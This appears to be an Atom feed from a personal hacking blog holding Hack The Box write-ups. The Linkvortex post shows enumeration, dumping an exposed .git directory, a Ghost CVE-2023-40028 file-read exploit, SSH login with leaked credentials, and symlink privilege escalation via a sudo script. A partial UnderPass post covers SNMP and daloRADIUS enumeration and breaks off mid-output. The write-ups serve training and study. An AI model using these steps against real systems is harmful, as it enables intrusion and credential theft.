<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>NUTZH</title>
  
  
  <link href="http://0xdezznutz.github.io/atom.xml" rel="self"/>
  
  <link href="http://0xdezznutz.github.io/"/>
  <updated>2024-12-27T21:46:51.141Z</updated>
  <id>http://0xdezznutz.github.io/</id>
  
  <author>
    <name>NUTZH</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linkvortex</title>
    <link href="http://0xdezznutz.github.io/linkvortex/"/>
    <id>http://0xdezznutz.github.io/linkvortex/</id>
    <published>2024-12-27T11:58:19.524Z</published>
    <updated>2024-12-27T21:46:51.141Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h2><ol><li><a href="#initial-enumeration-with-nmap">Initial Enumeration with Nmap</a></li><li><a href="#step-2-enumeration-of-http-service">Step 2: Enumeration of HTTP Service</a></li><li><a href="#step-3-subdomain-enumeration">Step 3: Subdomain Enumeration</a></li><li><a href="#step-4-enumerating-devlinkvortexhtb">Step 4: Enumerating dev.linkvortex.htb</a></li><li><a href="#step-5-exploiting-the-login-page">Step 5: Exploiting the Login Page</a></li><li><a href="#step-6-ssh-access">Step 6: SSH Access</a></li><li><a href="#step-7-privilege-escalation">Step 7: Privilege Escalation</a></li></ol><p>In this write-up, we will walk through the steps to hack the Linkvortex machine on Hack The Box. Let’s dive in!</p><h2 id="Initial-Enumeration-with-Nmap"><a href="#Initial-Enumeration-with-Nmap" class="headerlink" title="Initial Enumeration with Nmap"></a>Initial Enumeration with Nmap</h2><p> We start by scanning the target machine for open ports using Nmap:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sV 10.10.11.47 </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 07:01 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> linkvortex.htb (10.10.11.47)</span><br><span class="line">Host is up (0.064s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.11 seconds</span><br></pre></td></tr></table></figure><p>We find two open ports:</p><ul>  <li><strong>Port 22</strong>: SSH (OpenSSH 8.9p1)</li>  <li><strong>Port 80</strong>: HTTP (Apache)</li></ul><h2 id="Step-2-Enumeration-of-HTTP-Service"><a href="#Step-2-Enumeration-of-HTTP-Service" class="headerlink" title="Step 2: Enumeration of HTTP Service"></a>Step 2: Enumeration of HTTP Service</h2><p>We proceed to brute-force directories using Dirsearch:</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ dirsearch -u http://linkvortex.htb/ -x 404</span><br><span class="line"></span><br><span class="line"> [07:05:48] 200 -  103B  - /robots.txt</span><br><span class="line"> [07:05:51] 200 -  256B  - /sitemap.xml</span><br><span class="line"> [07:05:49] 403 -  199B  - /server-status                                   </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed  </span><br></pre></td></tr></table></figure><p>The &#x2F;robots.txt file reveals the following:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Disallow: /ghost/</span><br></pre></td></tr></table></figure><p>This indicates a potential login page at &#x2F;ghost&#x2F;.</p><h2 id="Step-3-Subdomain-Enumeration"><a href="#Step-3-Subdomain-Enumeration" class="headerlink" title="Step 3: Subdomain Enumeration"></a>Step 3: Subdomain Enumeration</h2><p>Using FFUF, we enumerate subdomains:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ffuf -u http://linkvortex.htb/ -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H <span class="string">&quot;Host:FUZZ.linkvortex.htb&quot;</span> -mc 200</span><br><span class="line"></span><br><span class="line"> dev                     [ Status: 200, Size: 2538, Words: 670, Lines: 116]</span><br></pre></td></tr></table></figure><p>We discover a subdomain dev.linkvortex.htb. Adding this to our &#x2F;etc&#x2F;hosts file allows us to access it. </p><h2 id="Step-4-Enumerating-dev-linkvortex-htb"><a href="#Step-4-Enumerating-dev-linkvortex-htb" class="headerlink" title="Step 4: Enumerating dev.linkvortex.htb"></a>Step 4: Enumerating dev.linkvortex.htb</h2><p>We run Dirsearch again on the subdomain:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">$  dirsearch -u dev.linkvortex.htb</span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/reports/_dev.linkvortex.htb/_24-12-27_07-25-41.txt</span><br><span class="line"></span><br><span class="line">Target: http://dev.linkvortex.htb/</span><br><span class="line"></span><br><span class="line"> [07:25:41] Starting:                                                                                                                              </span><br><span class="line"> [07:25:43] 200 -   73B  - /.git/description                                 </span><br><span class="line"> [07:25:43] 200 -  201B  - /.git/config                                      </span><br><span class="line"> [07:25:43] 200 -  620B  - /.git/hooks/</span><br><span class="line"> [07:25:43] 200 -  557B  - /.git/                                            </span><br><span class="line"> [07:25:43] 200 -   41B  - /.git/HEAD</span><br><span class="line"> [07:25:43] 301 -  239B  - /.git  -&gt;  http://dev.linkvortex.htb/.git/        </span><br><span class="line"> [07:25:43] 200 -  402B  - /.git/info/                                       </span><br><span class="line"> [07:25:43] 200 -  401B  - /.git/logs/</span><br><span class="line"> [07:25:43] 200 -  175B  - /.git/logs/HEAD                                   </span><br><span class="line"> [07:25:43] 200 -  240B  - /.git/info/exclude                                </span><br><span class="line"> [07:25:44] 200 -  393B  - /.git/refs/                                       </span><br><span class="line"> [07:25:44] 200 -  418B  - /.git/objects/</span><br><span class="line"> [07:25:44] 200 -  147B  - /.git/packed-refs                                 </span><br><span class="line"> [07:25:44] 301 -  249B  - /.git/refs/tags  -&gt;  http://dev.linkvortex.htb/.git/refs/tags/</span><br><span class="line"> [07:25:44] 200 -  691KB - /.git/index                                       </span><br><span class="line"> [07:25:44] 403 -  199B  - /.ht_wsr.txt                                      </span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccess.bak1                                   </span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccess.orig                                   </span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccess.sample                                 </span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccess_extra                                  </span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccessBAK</span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccessOLD2</span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccess.save                                   </span><br><span class="line"> [07:25:44] 403 -  199B  - /.htm</span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccess_sc</span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccess_orig</span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccessOLD                                     </span><br><span class="line"> [07:25:44] 403 -  199B  - /.html</span><br><span class="line"> [07:25:44] 403 -  199B  - /.htpasswd_test                                   </span><br><span class="line"> [07:25:44] 403 -  199B  - /.htpasswds                                       </span><br><span class="line"> [07:25:44] 403 -  199B  - /.httr-oauth</span><br><span class="line"> [07:26:03] 403 -  199B  - /cgi-bin/                                         </span><br><span class="line"> [07:26:30] 403 -  199B  - /server-status/                                   </span><br><span class="line"> [07:26:30] 403 -  199B  - /server-status                                    </span><br><span class="line"> Task Completed</span><br></pre></td></tr></table></figure><p>The presence of the .git directory suggests potential sensitive information.<br> We use GitHack to extract its contents:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python Githack.py http://dev.linkvortex.htb/.git/</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>The extracted files include authentication.test.js, which contains hardcoded<br>credentials:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const password = <span class="string">&#x27;OctopiFociPilfer45&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="Step-5-Exploiting-the-Login-Page"><a href="#Step-5-Exploiting-the-Login-Page" class="headerlink" title="Step 5: Exploiting the Login Page"></a>Step 5: Exploiting the Login Page</h2><p>We use the credentials to log in to &#x2F;ghost&#x2F;:</p><ul>  <li><strong>Username</strong>: admin@linkvortex.htb</li>  <li><strong>Password</strong>: OctopiFociPilfer45</li></ul><p>After logging in, we find the machine is running a vulnerable version of Ghost CMS.<br>We exploit CVE-2023-40028 to read arbitrary files:<br>BTW: after downloading the CVE change the URL from the host the </p><p> http://linkvortex.htb </p> read the config file that we found in dockerfile.ghost<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ bash CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45</span><br><span class="line"> WELCOME TO THE CVE-2023-40028 SHELL</span><br><span class="line"> file&gt; /var/lib/ghost/config.production.json</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>The exploit reveals the following:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://localhost:2368&quot;</span>,</span><br><span class="line"><span class="string">&quot;server&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;port&quot;</span>: 2368,</span><br><span class="line">  <span class="string">&quot;host&quot;</span>: <span class="string">&quot;::&quot;</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line"><span class="string">&quot;mail&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;transport&quot;</span>: <span class="string">&quot;Direct&quot;</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line"><span class="string">&quot;logging&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;transports&quot;</span>: [<span class="string">&quot;stdout&quot;</span>]</span><br><span class="line">&#125;,&#123;</span><br><span class="line"><span class="string">&quot;process&quot;</span>: <span class="string">&quot;systemd&quot;</span>,</span><br><span class="line"><span class="string">&quot;paths&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;contentPath&quot;</span>: <span class="string">&quot;/var/lib/ghost/content&quot;</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line"><span class="string">&quot;spam&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;user_login&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;minWait&quot;</span>: 1,</span><br><span class="line">      <span class="string">&quot;maxWait&quot;</span>: 604800000,</span><br><span class="line">      <span class="string">&quot;freeRetries&quot;</span>: 5000</span><br><span class="line">  &#125;,&#123;</span><br><span class="line"><span class="string">&quot;mail&quot;</span>: &#123;</span><br><span class="line">   <span class="string">&quot;transport&quot;</span>: <span class="string">&quot;SMTP&quot;</span>,</span><br><span class="line">   <span class="string">&quot;options&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;service&quot;</span>: <span class="string">&quot;Google&quot;</span>,</span><br><span class="line">    <span class="string">&quot;host&quot;</span>: <span class="string">&quot;linkvortex.htb&quot;</span>,</span><br><span class="line">    <span class="string">&quot;port&quot;</span>: 587,</span><br><span class="line">    <span class="string">&quot;auth&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;user&quot;</span>: <span class="string">&quot;bob@linkvortex.htb&quot;</span>,</span><br><span class="line">      <span class="string">&quot;pass&quot;</span>: <span class="string">&quot;fibber-talented-worth&quot;</span></span><br><span class="line">      </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>Finally i try soo many time to get that i thought the CVE isnt working but idk somehow it works<br>so we got the password and the username.<br>Using the credentials:</p><ul>  <li><strong>Username</strong>: bob@linkvortex.htb</li>  <li><strong>Password</strong>: fibber-talented-worth</li></ul><h2 id="Step-6-SSH-Access"><a href="#Step-6-SSH-Access" class="headerlink" title="Step 6: SSH Access"></a>Step 6: SSH Access</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ssh bob@linkvortex.htb</span><br><span class="line"> <span class="comment"># bob@linkvortex.htb&#x27;s password: fibber-talented-worth</span></span><br><span class="line"></span><br><span class="line">$ bob@linkvortex:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">a6acafe1314c70.... <span class="comment"># u can do it </span></span><br></pre></td></tr></table></figure><h2 id="Step-7-Privilege-Escalation"><a href="#Step-7-Privilege-Escalation" class="headerlink" title="Step 7: Privilege Escalation"></a>Step 7: Privilege Escalation</h2><p>We check Bob’s sudo privileges:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ bob@linkvortex:~$ <span class="built_in">sudo</span> -l </span><br><span class="line"> Matching Defaults entries <span class="keyword">for</span> bob on linkvortex:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,</span><br><span class="line">    env_keep+=CHECK_CONTENT</span><br><span class="line"></span><br><span class="line"> User bob may run the following commands on linkvortex:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png</span><br></pre></td></tr></table></figure><p>after reading the code of the clean_symlink.sh , The script allows us to use symbolic links to read files.<br> We exploit it to read &#x2F;root&#x2F;root.txt:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bob@linkvortex:~$ <span class="built_in">ln</span> -s /root/root.txt nutzh.txt <span class="comment">#so we create a link between nutzh and root.txt</span></span><br><span class="line">bob@linkvortex:~$ <span class="built_in">ln</span> -s /home/bob/nutzh.txt bob.png <span class="comment"># look the clean_symlink code he can read through the image files</span></span><br><span class="line">bob@linkvortex:~$ <span class="built_in">sudo</span> CHECK_CONTENT=<span class="literal">true</span> /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/bob.png</span><br><span class="line"> Link found [ /home/bob/bob.png ] , moving it to quarantine</span><br><span class="line"> Content:</span><br><span class="line"> c2f05024dc11bbd7dad.... <span class="comment">#u got this mate</span></span><br></pre></td></tr></table></figure><p> CONCLUSION : </p><p>Key Takeaways:</p><p>Use enumeration tools like Dirsearch, FFUF, and GitHack to uncover hidden resources.</p><p>Exploit known vulnerabilities (e.g., CVE-2023-40028) for information disclosure.</p><p>Understand symlink exploitation to escalate privileges.</p><pre><code> Congratulations! You&#39;ve rooted the Linkvortex machine. 🎉</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Table-of-Contents&quot;&gt;&lt;a href=&quot;#Table-of-Contents&quot; class=&quot;headerlink&quot; title=&quot;Table of Contents&quot;&gt;&lt;/a&gt;Table of Contents&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;a h</summary>
      
    
    
    
    <category term="ACTIVE MACHINE" scheme="http://0xdezznutz.github.io/categories/ACTIVE-MACHINE/"/>
    
    
    <category term="HACK THE BOX" scheme="http://0xdezznutz.github.io/tags/HACK-THE-BOX/"/>
    
    <category term="LINUX" scheme="http://0xdezznutz.github.io/tags/LINUX/"/>
    
    <category term="CTF" scheme="http://0xdezznutz.github.io/tags/CTF/"/>
    
    <category term="PENETRATION TESTING" scheme="http://0xdezznutz.github.io/tags/PENETRATION-TESTING/"/>
    
  </entry>
  
  <entry>
    <title>Idea</title>
    <link href="http://0xdezznutz.github.io/Idea/"/>
    <id>http://0xdezznutz.github.io/Idea/</id>
    <published>2024-12-25T23:21:52.000Z</published>
    <updated>2024-12-26T20:56:29.662Z</updated>
    
    <content type="html"><![CDATA[<p>Create in this website a function that can decode every HASH , u can see crackstation and some old project about HASH #BEST FOR U MATE</p><ul><li>new idea : chat history search , like if i want to search about a password that was in deep in a conversation with my fucking friend ; how i can do that  maybe try to learn about LLM and RAG that better for u mate if u find a way to do that make it open source do not forget u should encrypt all the data of the user</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Create in this website a function that can decode every HASH , u can see crackstation and some old project about HASH #BEST FOR U MATE&lt;/p</summary>
      
    
    
    
    
    <category term="idea ," scheme="http://0xdezznutz.github.io/tags/idea/"/>
    
  </entry>
  
  <entry>
    <title>UnderPass</title>
    <link href="http://0xdezznutz.github.io/Underpass/"/>
    <id>http://0xdezznutz.github.io/Underpass/</id>
    <published>2024-12-25T13:36:03.052Z</published>
    <updated>2024-12-27T21:40:48.795Z</updated>
    
    <content type="html"><![CDATA[<p>Hello, today we gonna try to hack the Underpass machine  on hackthebox<br>the first thing is enumerate and see if there is an open port on the target<br>machine for that we gonna use the tool nmap </p><p>i tried to scan the machine in the first but i found just the port 80 and<br>22 so i tried with to scan UDP ports.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ nmap  -sU 10.10.11.48 -T5</span><br><span class="line">  Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-22 12:50 CST</span><br><span class="line">  Warning: 10.10.11.48 giving up on port because retransmission <span class="built_in">cap</span> hit (2).</span><br><span class="line">  Nmap scan report <span class="keyword">for</span> underpass.htb (10.10.11.48)</span><br><span class="line">  Host is up (0.073s latency).</span><br><span class="line">  Not shown: 897 open|filtered udp ports (no-response), 102 closed udp ports (port-unreach)</span><br><span class="line">  PORT    STATE SERVICE</span><br><span class="line">  161/udp open  snmp</span><br><span class="line"> </span><br><span class="line"> Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 100.11 seconds</span><br></pre></td></tr></table></figure><p>we find  SNMP port open and SNMP stands for service network management<br>protocol , that port is used monitor and manage the network devices<br>connected over an IP we gonna use now snmp-check tool that helps us<br>to enumerate the SNMP devices </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ snmp-check 10.10.11.48</span><br><span class="line"> snmp-check v1.9 - SNMP enumerator</span><br><span class="line"> Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)</span><br><span class="line"></span><br><span class="line"> [+] Try to connect to 10.10.11.48:161 using SNMPv1 and community <span class="string">&#x27;public&#x27;</span></span><br><span class="line"></span><br><span class="line"> [*] System information:</span><br><span class="line"></span><br><span class="line">  Host IP address               : 10.10.11.48</span><br><span class="line">  Hostname                      : UnDerPass.htb is the only daloradius server <span class="keyword">in</span> the basin!</span><br><span class="line">  Description                   : Linux underpass 5.15.0-126-generic <span class="comment">#136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64</span></span><br><span class="line">  Contact                       : steve@underpass.htb</span><br><span class="line">  Location                      : Nevada, U.S.A. but not Vegas</span><br><span class="line">  Uptime snmp                   : 00:49:46.89</span><br><span class="line">  Uptime system                 : 00:49:36.98</span><br><span class="line">  System <span class="built_in">date</span>                   : 2024-12-25 19:21:21.0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>interesting, we find a user:steve and the name of Host Underpass.htb<br>daloradius HMMM , lets look for it </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ dirsearch -u http://Underpass.htb/daloradius/</span><br><span class="line"></span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/reports/http_Underpass.htb/_daloradius_24-12-25_14-24-00.txt</span><br><span class="line"></span><br><span class="line">Target: http://Underpass.htb/</span><br><span class="line"></span><br><span class="line">[14:24:00] Starting: daloradius/                                                                                                                  </span><br><span class="line">[14:24:05] 200 -  221B  - /daloradius/.gitignore                            </span><br><span class="line">[14:24:29] 301 -  323B  - /daloradius/app  -&gt;  http://underpass.htb/daloradius/app/</span><br><span class="line">[14:24:35] 200 -   24KB - /daloradius/ChangeLog                             </span><br><span class="line">[14:24:41] 301 -  323B  - /daloradius/doc  -&gt;  http://underpass.htb/daloradius/doc/</span><br><span class="line">[14:24:41] 200 -    2KB - /daloradius/docker-compose.yml                    </span><br><span class="line">[14:24:41] 200 -    2KB - /daloradius/Dockerfile</span><br><span class="line">[14:24:55] 301 -  327B  - /daloradius/library  -&gt;  http://underpass.htb/daloradius/library/</span><br><span class="line">[14:24:55] 200 -   18KB - /daloradius/LICENSE                               </span><br><span class="line">[14:25:11] 200 -   10KB - /daloradius/README.md                             </span><br><span class="line">[14:25:15] 301 -  325B  - /daloradius/setup  -&gt;  http://underpass.htb/daloradius/setup/</span><br><span class="line">                                                                             </span><br><span class="line">Task Completed </span><br></pre></td></tr></table></figure><p>try to look for all these files and find something , lets brute force<br>the directories </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ dirsearch -u http://Underpass.htb/daloradius/app </span><br><span class="line"> /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                  </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                                                           </span><br><span class="line">                                                                                                                                                  </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/reports/http_Underpass.htb/_daloradius_app_24-12-25_14-33-44.txt</span><br><span class="line"></span><br><span class="line">Target: http://Underpass.htb/</span><br><span class="line"></span><br><span class="line">[14:33:44] Starting: daloradius/app/                                                                                                              </span><br><span class="line">[14:34:20] 301 -  330B  - /daloradius/app/common  -&gt;  http://underpass.htb/daloradius/app/common/</span><br><span class="line">[14:35:11] 301 -  329B  - /daloradius/app/users  -&gt;  http://underpass.htb/daloradius/app/users/</span><br><span class="line">[14:35:11] 302 -    0B  - /daloradius/app/users/  -&gt;  home-main.php         </span><br><span class="line">[14:35:11] 200 -    2KB - /daloradius/app/users/login.php </span><br></pre></td></tr></table></figure><p>WOOW , we find a login page Great , but we need Username lets brute force<br>directories more like &#x2F;doc so i brute forced till i found </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ [14:42:06] Starting: daloradius/doc/install/                                                                                                      </span><br><span class="line">  [14:42:55] 200 -    8KB - /daloradius/doc/install/INSTALL                   </span><br><span class="line">                                                                             </span><br><span class="line">  Task Completed</span><br></pre></td></tr></table></figure><p>after reading this file i we found the Username and the Password </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">5. INSTALLATION COMPLETE</span><br><span class="line"> ------------------------</span><br><span class="line">            Surf to http://yourip/daloradius</span><br><span class="line">            Login:</span><br><span class="line">          username: administrator</span><br><span class="line">          password: radius</span><br></pre></td></tr></table></figure><p>so i tried this administrator:radius and it failed so lets try to brute force<br>the &#x2F;app directory more and hope for something</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$  dirsearch -u http://Underpass.htb/daloradius/app/ -w SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt </span><br><span class="line">  /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/   pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span 